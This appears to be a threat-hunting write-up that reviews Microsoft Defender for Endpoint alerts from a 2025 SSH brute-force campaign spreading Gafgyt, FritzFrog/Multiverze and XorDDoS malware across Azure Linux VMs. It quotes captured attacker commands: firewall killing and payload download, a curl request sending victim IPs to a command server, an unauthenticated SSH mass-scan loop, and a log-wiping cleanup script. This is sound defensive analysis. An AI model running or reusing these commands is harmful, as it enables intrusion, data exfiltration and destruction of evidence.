# MDE Dashboard Review

This file summarizes alerts, incidents, and automated detections surfaced by Microsoft Defender for Endpoint (MDE) during the SSH brute-force campaign observed in March–April 2025.

The objective is to assess MDE’s automated coverage and correlate it with findings from manual threat hunting documented in `initial-threat-hunt.md`.

---

## Alert Storyline and Timeline of Detection

### February 17, 2025 — Initial Indicator of Compromise

**Device Involved:** `Linux-VulnMgmt-Kobe`  
**Time:** 8:37 PM  
**Activity:** Multiple failed SSH logon attempts followed by a successful brute-force login attempt from a Microsoft Azure IP.

**Note:** *The user had intentionally exposed the device to internet-facing SSH access. The SSH daemon was started, and after numerous failed logon attempts, a successful connection was made from IP `20.80.241.91` — a Microsoft Azure cloud address not inherently malicious. Malicious behavior was observed immediately after this connection, marking the initial indicator of compromise.*

<p align="center">
  <img src="https://github.com/user-attachments/assets/9d1387fd-0dfe-47ed-b662-f961fc7cc5ab" alt="Screenshot description" width="500"/>
  <img src="https://github.com/user-attachments/assets/cac9b34b-0d24-4e30-aeb5-9cc31a8d8bd1" alt="Screenshot description" width="500"/>
</p>

**Observed Command:**

```bash
-c "pkill firewalld  -9;pkill iptables -9;ulimit -e 999999;... rm -rf .bash_history; history -c
```
[View full command → `observed-commands.md`](./observed-commands.md#bisis-ssh-brute-force-command)

**Command Breakdown:**
- Disables local firewall protections by terminating `firewalld` and `iptables`
- Increases system resource limits with `ulimit`
- Downloads and executes multiple payloads from `194.32.145.243` using `wget`, `curl`, and `tftp`
- Cleans execution traces by deleting shell history and temporary files

<p align="center">
  <img src="https://github.com/user-attachments/assets/09a6b57f-0c77-49c0-b4fd-a39ba10e0a95" alt="Screenshot description" width="525"/>
  <img src="https://github.com/user-attachments/assets/c7ed4c85-88ff-4c10-bcb9-3c6356c5a814" alt="Screenshot description" width="475"/>
  <img src="https://github.com/user-attachments/assets/b00a6d04-c1cc-4442-af3a-4e373333d025" alt="Screenshot description" width="600"/>
</p>

**File Activity:** Execution of `logsbins.sh` triggered creation of multiple files named sequentially from `b` to `o`. Each of these files is distinct and has been flagged as malicious.

**Malware Association:** These alphabetically named files are linked to the **Gafgyt** botnet, commonly used to conscript infected systems into coordinated botnet operations.

**VirusTotal Scores:**
- IP `194.32.145.243`: `12/94`
- File `b`: `44/64` (add link to virustotal-summary)

---

### February 18-19, 2025 — Lateral Movement and Persistence Activity

#### February 18, 2025

**Devices Involved:**  
- `Linux-VulnMgmt-Kobe`  
- `linux-ubuntu-lab`  
- `ed-linux`

**Activity:**  
The device `Linux-VulnMgmt-Kobe` (IP `10.0.0.160`) began making repeated login attempts to other virtual machines within the tenant network. This activity triggered detection alerts for an **unusual number of failed sign-in attempts**.

**Screenshot Context:**
<p align="center">
  <img src="https://github.com/user-attachments/assets/6e52e8a7-ea19-4d40-b56d-566a20b9dc29" alt="Login Attempts Timeline" width="250"/>
  <img src="https://github.com/user-attachments/assets/22ac491f-e4fe-44db-9e88-f6e52e72d229" alt="Failed SSH Attempts on VM" width="400"/>
</p>
<p align="center">
  <img src="https://github.com/user-attachments/assets/316a6aef-1dfd-431e-84ed-8d8f0bf029c9" alt="Expanded Device Activity" width="700"/>
  <img src="https://github.com/user-attachments/assets/dc5d668b-7ec7-4192-8f5c-71211caca724" alt="Detailed SSH Activity" width="700"/>
</p>

**Behavior Observed:**  
- Device `Linux-VulnMgmt-Kobe` initiated multiple SSH brute-force attempts within the Azure tenant.
- The failed sign-in attempts suggest the attacker was systematically probing for weak SSH credentials.

---

**The compromise of the `Linux-VulnMgmt-Kobe` device on February 18 set the stage for subsequent lateral movement throughout the Azure tenant environment. Attackers leveraged the initial breach to pivot across the network, targeting additional virtual machines in the tenant infrastructure. This activity marked the start of a broader campaign of internal reconnaissance and credential harvesting.**

---

#### February 19, 2025

**Device Involved:**  
- `Linuz-scan-agent`

**Activity:**  
The device `Linuz-scan-agent`  was subjected to a similar pattern of brute-force attempts.  After numerous failed logon attempts, an attacker successfully gained access. Subsequently, the device began using the `cron` service to schedule execution of a file named `VwIEbFMroMSrleiJ`.

**File Details:**  
The file `VwIEbFMroMSrleiJ` shares the same obfuscated naming style as `UpzBUBnv` observed in previous threat-hunt findings (`initial-threat-hunt.md`).

**Screenshot Context:**
<p align="center">
  <img src="https://github.com/user-attachments/assets/3e4963e2-b321-4034-b902-e7eb4386d9fe" alt="Cron Execution Evidence" width="350"/>
  <img src="https://github.com/user-attachments/assets/d904a958-88d6-45ca-ad35-9178bfeb5487" alt="File Ingress Events" width="750"/>
</p>

**Additional Context:**  
Subsequent research confirmed that `VwIEbFMroMSrleiJ` is an ELF file associated with the **Gafgyt botnet**. It was scheduled via `cron` to execute every minute for a 1-minute interval, suggesting automated persistence.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/fa2da0dc-a09d-4898-9ee9-2949eb4f594f" alt="Detailed Process Timeline" width="700"/>
</p>

**VirusTotal Scores:**
- File `VwIEbFMroMSrleiJ`: **14/64**

---

### February 20, 2025 — Multiverze Trojan Deployment & Lateral Spread

**Devices Involved:**  
- `Levi-Linux-Vulnerability`  
- `Linux-Vuln-Test-Jonz`

**Observed Activity:**  
The compromised device `Levi-Linux-Vulnerability` downloaded a file named `YAvdMwRw` from IP `128.199.194.30`. This file is identified as **Multiverze** malware, part of the **FritzFrog** trojan family known for infecting Linux systems via SSH and spreading laterally using a peer-to-peer (P2P) network — explaining how it’s circulating through the Azure tenant.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/00469dee-993a-4b76-b3f1-7407a12a766c" width="700"/>
</p>

**Subsequent Behavior:**  
Execution of `YAvdMwRw` created two additional malicious files, `retea` and `Update`, both previously observed in the `initial-threat-hunt.md` analysis.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/a2fa0fb0-e5ac-46d8-ba73-4c4b7b9b48fb" width="800"/>
  <img src="https://github.com/user-attachments/assets/e3f3e114-4f26-4ef2-9e99-542552d52da9" width="800"/>
</p>

**Malicious Scripts Revisited:**  
The same malicious bash script identified earlier was re-used, executing `retea` and `network`, creating `kuak` and `diicot`, terminating known miner processes, disabling scheduled tasks, clearing logs, and downloading further payloads.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/be9d25e4-aaf8-4332-b85b-9a0d994dbae1" width="700"/>
</p>

**Concise Summary:**  
The script disables security measures and system tasks, downloads a remote payload, clears logs, modifies system limits, harvests credentials, and uses the `network` loader script to finalize compromise.

**Persistence & Obfuscation:**  
Shortly after, the `Update` file was seen re-creating a `cache` file used to avoid detection.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/dc9c1b26-4a05-4dde-8f13-46d825babc43" width="800"/>
  <img src="https://github.com/user-attachments/assets/153793e0-53f0-4a85-850a-17d1dd9472fe" width="800"/>
</p>

**VirusTotal Scores:**
- IP `128.199.194.30`: **8/94**  
- File `YAvdMwRw`: **34/64**  
- `retea`: **23/64**  
- `Update`: **27/63**

---

### March 4 & 7, 2025 — File Ingress & Persistence Mechanisms

#### March 4, 2025

**Device Involved:**  
- `Linux-Program-Fix`

**Observed Activity:**  
A file named `cache` was transferred from IP `170.64.230.111` to the `/tmp` directory via SCP.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/2c06592f-1ac1-4a8d-aee8-7ceb1969153f" width="700"/>
</p>

**Subsequent Behavior:**  
An additional file `MNFlEGNm` appeared and was executed, reflecting naming similarities to earlier malicious files like `UpzBUBnv`.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/14996335-df77-4ee9-bbba-8bc6ec6198b5" width="800"/>
</p>

**Malicious Activity:**  
Shortly after the execution of both `cache` and `MNFlEGNm`, a hidden process `.b` was executed, associated with persistence via `cron` jobs.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/55ac6de8-403f-42d6-b11f-b8035455a84f" width="800"/>
</p>

#### March 7, 2025

**Device Involved:**  
- `linux-programatic-ajs`

**Observed Activity:**  
A similar file ingress from IP `196.251.88.103` deposited `cache` in `/tmp`.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/6beead87-7cfc-4c3b-8bcf-5010a5f06bc9" width="700"/>
</p>

**Subsequent Behavior:**  
File `AqsEUmKy` was introduced and executed, mirroring previous obfuscated naming conventions. Simultaneously, a hidden `History` script was executed within `.update-logs`, followed by `Update`.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/60a1fa32-8ccd-421b-9176-89533271eb84" width="700"/>
</p>

**More Activity:**  
A file named `.bisis` was created, tagged as **PUA.Portscan**, typically used for network reconnaissance.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/2be455e3-a82d-4876-91b2-639c5ffcf726" width="700"/>
</p>

**VirusTotal Scores:**
- IP `170.64.230.111`: **3/94**  
- `.bisis`: **N/A**  
- Others: **N/A**

---

### March 8, 2025 — Covert Data Exfiltration

**Device Involved:**  
- `linux-programatic-ajs`

**Observed Activity:**  
`Update` executed a `curl` command to silently send the device’s IP address (`103.108.140.172`) to a remote server (`196.251.73.38:47`), using browser-like headers to disguise the traffic.

```bash
curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" \\
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \\
  -H "Accept-Language: en-US,en;q=0.9" \\
  -H "Cache-Control: max-age=0" \\
  -H "Connection: keep-alive" \\
  -H "Upgrade-Insecure-Requests: 1" \\
  --insecure
```

<p align="center">  
  <img src="https://github.com/user-attachments/assets/f780335a-18a6-4043-863c-23c756c3439b" width="700"/>
</p>

**VirusTotal Scores:**
- `Update`: **27/63**  
- IP `196.251.73.38:47`: **N/A**  
- IP `103.108.140.172`: **0/94**

---

### March 14 & 17, 2025 — Advanced Lateral Movement & Recon

#### March 14, 2025

**Device Involved:**  
- `sakel-linux-2`

**Observed Activity:**  
The `History` script executed `Update` within the `.update-logs` directory, creating `.bisis` and `cache`, followed by execution of the `cache` file.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/c4f416f2-61a5-4ee8-9302-1fc3f039cf9d" width="700"/>
  <img src="https://github.com/user-attachments/assets/24e63de5-8840-429c-b10c-9f119c1415cc" width="700"/>
</p>

**Additional Behavior:**  
A `cron` job launched `.b`, enabling it to run continuously from `/tmp`, and re-executed the `cache` file.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/1437548a-13c6-4bcd-92ba-fb7275099c7b" width="700"/>
</p>

**Exfiltration Activity:**  
`Update` was executed, followed by a `curl` GET request to `http://196.251.73.38:47/save-data`, exfiltrating the device’s IP (`45.64.186.20`).

<p align="center">  
  <img src="https://github.com/user-attachments/assets/3c089219-b09e-4c85-a080-a0782ca36cca" width="700"/>
</p>

#### March 17, 2025

**Activity:**  
The `Update` file was run again, mirroring the `.b` activity from March 14.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/6756dbbe-9f5d-4b97-9475-cc4cf4850e6c" width="700"/>
</p>

**Lateral Movement Behavior:**  
A bash command was run, leveraging `.bisis` to connect to a list of IPs using SSH without authentication, then executing script `x`.

```bash
bash -c "
cd /var/tmp/.update-logs
chmod +x /var/tmp/.update-logs/.bisis
ulimit -n 999999
cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
/var/tmp/.update-logs/x
"
```

```bash
/var/tmp/.update-logs/./.bisis ssh \\
  -o /var/tmp/.update-logs/data.json \\
  --userauth none \\
  --timeout 8
```

<p align="center">  
  <img src="https://github.com/user-attachments/assets/067ad23e-3d6a-44b7-ae61-9cedc5a0f9a5" width="700"/>
</p>

**Recon & Lateral Movement:**  
`.bisis` was used to connect to multiple IP addresses, performing scans and brute-forcing.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/58b57c3f-d9c8-45f4-8e34-014fe41d24c4" width="700"/>
  <img src="https://github.com/user-attachments/assets/e8f5d598-68d9-4b86-adda-ed9f1299b869" width="700"/>
  <img src="https://github.com/user-attachments/assets/19e9e631-9908-441c-8a50-71c48a9d38cc" width="700"/>
  <img src="https://github.com/user-attachments/assets/b6789f4d-4bc2-47ea-8035-91583df73889" width="700"/>
</p>

**Final Activity:**  
`Update` executed another `curl` command, exfiltrating the IP address `200.98.136.217` to `196.251.73.38:47`.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/8b4825ab-89bd-40ba-819f-2a94d39266c1" width="700"/>
</p>

**VirusTotal Scores:**
- `History`: **N/A**  
- `Update`: **27/63**  
- `.bisis`: **6/64**  
- `cache`: **34/64**  
- `.b`: **N/A**  
- IP `196.251.73.38:47`: **N/A**

---

### March 24, 2025 — XorDDoS Deployment, Obfuscation, and System Manipulation

**Device Involved:**  
- `JR-Linux-VM-Test`

**Observed Activity:**  
The device `JR-Linux-VM-Test` was observed running a bash script designed to locate a writable directory, download several executables from a malicious domain, and execute them. To evade detection, the script deleted system and audit logs, renamed system binaries like `wget`, and cleared command history. The downloads originated from the IP `169.239.130.12`, previously seen in connection with the creation of the file `ygljglkjgfg1`.

**Downloaded Files:**  
Execution of the malicious file `ygljglkjgfg1` resulted in the creation of a shell script named `gcc.sh`.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/207b2847-45be-43b6-acbc-85d872c58365" width="700"/>
  <img src="https://github.com/user-attachments/assets/8abd4a37-5efd-45e0-831b-d1d5a0c91fac" width="700"/>
</p>

**Malicious Behavior:**  
Subsequent commands removed scheduled cron jobs, deleted SSH authorized keys, cleared logs, and terminated known cryptomining processes (like `xmrig`, `java`, and `cnrig`). Payloads and related directories were wiped, and the malicious file `sBksNkqW` was executed from `/var/tmp/` in stealth mode (detached, no output). Command history was cleared to cover tracks.

**Key Bash Command:**
```bash
bash -c "
crontab -r
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
cd /var/tmp

rm -rf /dev/shm/.x /dev/shm/rete* /var/tmp/payload /tmp/.diicot /tmp/kuak
chattr -iae /var/tmp/Documents/.diicot
chattr -iae /var/tmp/.update-logs/History
chattr -iae /var/tmp/.update-logs/Update

rm -rf /var/tmp/.update-logs /var/tmp/Documents
mkdir /var/tmp/Documents >/dev/null 2>&1

cd /var/tmp/
pkill Opera
rm -rf /var/tmp/Documents /var/tmp/.update-logs
rm -rf xmrig .diicot .black Opera
rm -rf .black xmrig.1
pkill cnrig
pkill java
killall java
pkill xmrig
killall cnrig
killall xmrig

cd /var/tmp/
chmod 777 sBksNkqW
./sBksNkqW </dev/null &>/dev/null & disown

history -c
rm -rf .bash_history ~/.bash_history
"
```

**Further Activity:**  
The execution of `sBksNkqW` triggered a bash command that made the hidden `History` file in `/var/tmp/.update-logs` executable, waited 15 seconds, then ran it. This suggests delayed execution to avoid immediate detection. Following this, both the `History` and `Update` files were executed, resulting in the creation of the `.bisis` file.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/86b3831e-04eb-45dd-a53b-377e67315fcf" width="700"/>
  <img src="https://github.com/user-attachments/assets/1e3ea9c2-28d8-4d72-a1cf-099633159153" width="700"/>
</p>

**Stealth & Obfuscation:**  
An unknown process was observed creating a file named `libudev.so.6`, which appeared to be the previously seen `ygljglkjgfg1` file, now renamed to masquerade as a legitimate shared library.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/dbfcfe02-a725-4f02-b6ff-8ffd6f97db1e" width="700"/>
</p>

**VirusTotal Scores:**  
- `gcc.sh`: **27/61**

---

### March 26 – April 15, 2025 — Final Wave of File Ingress and Repeated Persistence Activity

**Devices Involved:**  
- `linux-vm-vulnerability-test` (March 26)  
- `linux-vulnerability-test-dylan` (March 29)  
- `linuxremediation` (April 15)

**Observed Activity:**  
The devices `linux-vm-vulnerability-test` and `linux-vulnerability-test-dylan` exhibited behavior consistent with previously compromised systems. Specifically, known malicious files — `History`, `Update`, and `.bisis` — were observed being introduced and executed, continuing the attacker’s established pattern of persistence, reconnaissance, and potential lateral movement.

<p align="center"> 
  <img src="https://github.com/user-attachments/assets/73bab3f0-5418-4eaf-a7aa-bd974fe50038" width="400"/>
  <img src="https://github.com/user-attachments/assets/67793d3f-6f60-4ddd-b6df-7f8d3e644550" width="400"/>
  <img src="https://github.com/user-attachments/assets/f9863d77-48d1-4d7b-b95b-66ea513701d7" width="750"/>
  <img src="https://github.com/user-attachments/assets/96a1ecf8-1a7e-4e9a-a0b4-480d34fa4f12" width="450"/>
</p>

**April 15 – Final Recorded Activity:**  
The last entry on the Microsoft Defender for Endpoint *Incidents* dashboard involved the device `linuxremediation`.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/2e6638c4-7843-49d6-a55b-bec0655ea7b8" width="450"/>
</p>

An **Unknown Process Name** was observed repeatedly creating the file `libudev.so.6`, which matches the behavior and file renaming pattern used in earlier stages of the attack. Additionally, the script `gcc.sh` — previously associated with the **XorDDoS** dropper — was executed from the `/etc/cron.hourly/` directory, likely responsible for re-generating the `libudev.so.6` file.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/52659fde-496c-4cad-a5db-be79237791e1" width="450"/>
  <img src="https://github.com/user-attachments/assets/3b6ddf2e-ede1-4a2c-928b-7df9869c7c43" width="500"/>
</p>

**Conclusion:**  
No further malicious behavior was detected beyond the repeated creation of the `libudev.so.6` file. This marks the end of observable activity for this specific incident.

---

## Conclusion

The MDE Dashboard Review revealed that while Microsoft Defender for Endpoint (MDE) was able to detect certain brute-force attempts and network-based indicators tied to known threat infrastructure, much of the mid-stage malicious activity went unnoticed without manual correlation. Initial compromise activity on February 17 began with the successful brute-force of `Linux-VulnMgmt-Kobe`, followed by internal SSH-based lateral movement and the deployment of malware like `Gafgyt`, `Multiverze`, and `XorDDoS` across a wide array of Azure-based Linux virtual machines.

Throughout the campaign, attackers consistently reused obfuscated scripts (`Update`, `cache`, `History`, `.bisis`) and leveraged cron-based scheduling to maintain persistence. Obfuscation techniques such as renaming payloads to mimic legitimate binaries (e.g., `libudev.so.6`) and concealing command execution further reduced the likelihood of detection. Exfiltration activity was stealthy, utilizing crafted `curl` requests with browser headers.

Although the campaign had a wide reach, MDE failed to surface activity on impacted devices and overlooked key behaviors. Notably, the device `linuxvmcraig`—which attempted SSH brute-force attacks on over 3,500 targets ([initial-threat-hunt.md](https://github.com/gabriel-espinoza-77/azure-ssh-brute-force-analysis))—did not appear at all in the *Incidents* dashboard. These detection blind spots are why a deeper manual investigation was conducted to gain a clearer understanding of the full extent of the intrusion.

This investigation highlights the critical need for multiple layers of visibility in cloud environments, particularly when facing threat actors such as **Diicot**, who demonstrate reuse of tooling, stealth persistence, and automation across multiple hosts. It also highlights critical detection gaps when relying on endpoint telemetry alone, emphasizing the importance of proactive threat hunting and integration of external intelligence.

No malicious behavior was observed after April 15, 2025. At this point, activity linked to this incident appears to have concluded.

